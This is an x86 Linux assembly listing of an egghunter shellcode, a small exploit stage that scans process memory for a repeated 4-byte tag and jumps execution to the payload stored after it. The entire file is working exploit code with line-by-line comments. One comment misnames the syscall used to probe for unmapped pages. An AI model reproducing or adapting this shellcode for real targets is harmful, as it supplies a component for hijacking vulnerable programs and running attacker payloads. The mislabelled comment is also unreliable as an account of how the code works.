global _start

section .text

_start:

  mov ebx, 0x50905090     ; Store EGG in ebx  
  xor ecx, ecx            ; Zero out ECX  
  mul ecx                 ; Zero out EAX and EDX

npage:                    
  
  or dx, 0xfff            ; Align a region of memory

naddr:
  
  inc edx                 ; increase EDX to achieve 4096 bytes page (4KiB)                                   
  pushad                  ; push the general purpose values into the stack
  lea ebx, [edx+4]        ; put address [edx+4] to ebx  
  mov al, 0x4e            ; syscall for mkdir() to lower byte register al  
  int 0x80                ; call mkdir()   
  cmp al, 0xf2            ; 0xf2 is 242 in decimal - check for EFAULT (errno code 256-242 = 14 - bad file address) 
  
  popad                   ; restore the general purpose registers 
  jz npage                ; if mkdir() returned EFAULT, go to the next page 
  cmp [edx], ebx          ; check if egg 0x50905090 tag is in [edx] address
  jnz  naddr              ; if ZF=0 then it doesnt match so it goes to the next page
  cmp [edx+4], ebx        ; also check if EGG second tag is found in [edx+4] 
  jne naddr               ; If egg (0x50905090) tag not found then visit next address 
  jmp edx                 ; [edx] and [edx+4] contain the second egg (0x50905090)
